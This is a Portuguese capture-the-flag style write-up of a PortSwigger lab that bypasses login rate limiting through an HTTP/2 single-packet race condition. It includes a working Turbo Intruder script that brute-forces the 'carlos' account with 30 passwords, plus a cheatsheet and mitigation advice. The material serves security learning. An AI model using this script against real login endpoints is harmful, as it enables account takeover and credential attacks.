---
title: "Bypass de Rate Limits via Race Conditions"
platform: "PortSwigger"
category: "Race Conditions"
difficulty: "Apprentice"
date: 2026-02-15
techniques: ["TOCTOU", "Brute-Force", "Single-Packet Attack"]
description: "Race condition via single-packet HTTP/2 burlando rate limiting de login — 30 tentativas de senha passam pela checagem TOCTOU antes do contador incrementar."
lang: pt-br
translation_key: race-condition-bypassing-rate-limits
permalink: /writeups/race-condition-bypassing-rate-limits/pt/
---

## Plataforma
PortSwigger Web Security Academy

## Categoria
Race Conditions

## Dificuldade
Apprentice

## Objetivo
Burlar o mecanismo de rate limiting do login usando uma race condition, fazer brute-force na senha do usuário `carlos`, acessar o painel admin e deletar o usuário carlos.

---

## Contexto

O lab implementa rate limiting no endpoint de login pra prevenir ataques de brute-force. Após um certo número de tentativas falhadas, a conta é bloqueada. Porém, o mecanismo de rate limiting tem uma vulnerabilidade TOCTOU: ele verifica o contador de tentativas, processa o login, e só então incrementa o contador. Ao enviar todas as tentativas de senha simultaneamente em um único pacote, várias requisições passam pela verificação de rate limit antes do contador ser atualizado.

---

## Reconhecimento

### Credenciais
- **Conta de teste:** wiener:peter
- **Conta alvo:** carlos (senha desconhecida)

### Endpoints Principais

| Endpoint | Método | Propósito |
|---|---|---|
| `/login` | GET | Página de login (contém token CSRF) |
| `/login` | POST | Submeter credenciais de login |
| `/admin` | GET | Painel admin (requer login admin) |

### Wordlist de Senhas (fornecida pelo lab)
```
123123, abc123, football, monkey, letmein, shadow, master, 666666, qwertyuiop, 123321, mustang, 123456, password, 12345678, qwerty, 123456789, 12345, 1234, 111111, 1234567, dragon, 1234567890, michael, x654321, superman, 1qaz2wsx, baseball, 7777777, 121212, 000000
```

### Análise da Requisição
Login capturado via Burp Proxy:

```http
POST /login HTTP/2
Host: 0a51003904b1e8e38133ac30004d009f.web-security-academy.net
Cookie: session=SkAqZxlHBfsLG7xd1DpCNdyDmvOx9Esp
Content-Type: application/x-www-form-urlencoded

csrf=LixGlQiW7qZcFjspcfcHC0xeI6U5EbJs&username=carlos&password=%s
```

### Observações
- Enviar tentativas de login sequencialmente dispara rate limiting após algumas falhas
- A checagem do rate limit e o incremento não são atômicos — vulnerabilidade TOCTOU clássica
- Single-packet attack via HTTP/2 entrega todas as tentativas antes do contador incrementar

---

## Exploração

### Fluxo Vulnerável (TOCTOU)
```
Todas as 30 requisições chegam simultaneamente via single-packet attack:

Request 1 (password=123123):  CHECK rate limit → OK → process login → FAIL → increment counter
Request 2 (password=abc123):  CHECK rate limit → OK → process login → FAIL → increment counter
...
Request 28 (password=7777777): CHECK rate limit → OK → process login → SUCCESS → 302 redirect
...
                                                  ↑
                              Todas passam pelo CHECK antes de qualquer increment terminar
```

### Passos do Ataque

1. **Capturar requisição de login** — logado como `wiener:peter` para capturar o `POST /login` no HTTP History do Burp
2. **Enviar pro Turbo Intruder** — botão direito no `POST /login` → Extensions → Turbo Intruder → Send to Turbo Intruder
3. **Modificar a requisição** — mudei `username=wiener` para `username=carlos` e `password=peter` para `password=%s`
4. **Configurar script do Turbo Intruder** para single-packet attack:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    passwords = ['123123','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','1234567890','michael','x654321','superman','1qaz2wsx','baseball','7777777','121212','000000']

    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

5. **Primeira tentativa falhou** — todas as respostas voltaram 400 "Invalid CSRF token" porque o cookie de sessão e o token CSRF da captura inicial tinham expirado
6. **Segunda tentativa** — atualizei a página de login pra obter um novo cookie de sessão e token CSRF, atualizei a requisição no Turbo Intruder e re-rodei o ataque
7. **Análise dos resultados** — ordenado pela coluna Status:
   - 1 requisição retornou **302** (redirect para /my-account) com payload `7777777`
   - Várias retornaram **200** (login falho)
   - Várias retornaram **400** (rate limit / erros de CSRF)
8. **Limpei cookies do navegador** — o ataque tinha invalidado a sessão do navegador
9. **Logado como carlos** — usei credenciais `carlos:7777777`
10. **Acessei o painel admin** e deletei o usuário carlos

### Resultado
- **Senha encontrada:** 7777777
- **Tempo restante:** 6:03 de 15:00 minutos
- **Status do lab:** Solved

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Credential Access | Brute Force | T1110 |
| Defense Evasion | Exploitation for Defense Evasion | T1211 |
| Initial Access | Valid Accounts | T1078 |

### CWE
- **CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- **CWE-307:** Improper Restriction of Excessive Authentication Attempts

---

## Conceitos-Chave Aprendidos

| Conceito | Descrição |
|---|---|
| Bypass de Rate Limit via Race Condition | Enviar todas as tentativas simultaneamente para que passem pela checagem de rate antes do contador incrementar |
| Single-Packet Attack | Técnica HTTP/2 para entregar 30 requisições em um único pacote TCP, eliminando jitter de rede |
| Mecanismo de Gate do Turbo Intruder | `gate='race1'` segura todas as requisições até `openGate('race1')` liberar todas simultaneamente |
| Frescor do Token CSRF | Tokens CSRF estão atrelados a sessões — sessões expiradas invalidam tokens, exigindo nova captura |

---

## Ferramentas Utilizadas

| Ferramenta | Propósito |
|---|---|
| Burp Suite Community | Proxy, HTTP History |
| Turbo Intruder | Single-packet attack com lista de senhas para brute force via race condition |
| Firefox (Kali) | Navegador com proxy configurado em 127.0.0.1:8080 |

---

## Cheatsheet de Comandos & Técnicas

```
# Turbo Intruder — Fluxo de Brute Force via Race Condition
1. Capturar POST /login em Proxy → HTTP History
2. Botão direito → Extensions → Turbo Intruder → Send to Turbo Intruder
3. Mudar valor do password para %s (placeholder)
4. Usar Engine.BURP2 com concurrentConnections=1 para single-packet attack
5. Enfileirar todas as senhas com mesmo gate
6. openGate() pra liberar todas simultaneamente
7. Ordenar resultados por Status — 302 = login bem-sucedido
8. Se erro de CSRF: atualizar página de login, pegar nova sessão + token, atualizar request, retentar
```

---

## Erros e Lições Aprendidas

1. **Token CSRF expirado** — Primeira tentativa retornou "Invalid CSRF token" em todas as requisições porque a sessão da captura inicial tinha expirado. Fix: sempre obter cookie de sessão e token CSRF fresco imediatamente antes de lançar o ataque no Turbo Intruder.
2. **Sessão do navegador invalidada** — Após o ataque, o navegador não conseguia logar porque os cookies estavam stale. Fix: limpar cookies (clicar no cadeado → Clear cookies and site data) antes de tentar logar pelo navegador.
3. **Rate limit vs Race condition** — Brute force sequencial é bloqueado pelo rate limiting, mas enviar todas as tentativas em paralelo burla porque o contador ainda não incrementou quando as requisições são processadas.

---

## Mitigação

Para prevenir essa race condition no rate limiting:

- **Incremento atômico do contador:** Use operações atômicas a nível de banco (ex: Redis INCR) para incrementar o contador antes de processar o login, não depois
- **Lockout de conta por flag:** Setar uma flag de bloqueado no registro da conta usando SELECT FOR UPDATE antes de processar qualquer tentativa de login
- **Token bucket com lock distribuído:** Implementar rate limiting na infraestrutura (ex: token bucket em Redis) que opera independente da lógica da aplicação

---

## Reflexão

Esse lab demonstra como race conditions podem burlar controles de segurança, não só lógica de negócio. Rate limiting é uma defesa crítica contra ataques de brute force, mas quando o check-and-increment não é atômico, um atacante pode enviar todas as tentativas simultaneamente e burlar tudo. O Turbo Intruder com Engine.BURP2 tornou trivial — todas as 30 senhas testadas em um único pacote, e a correta identificada pelo status code único de 302. O problema do token CSRF foi uma complicação realista que também ocorre em testes do mundo real — sempre garanta tokens frescos antes de lançar ataques paralelos.
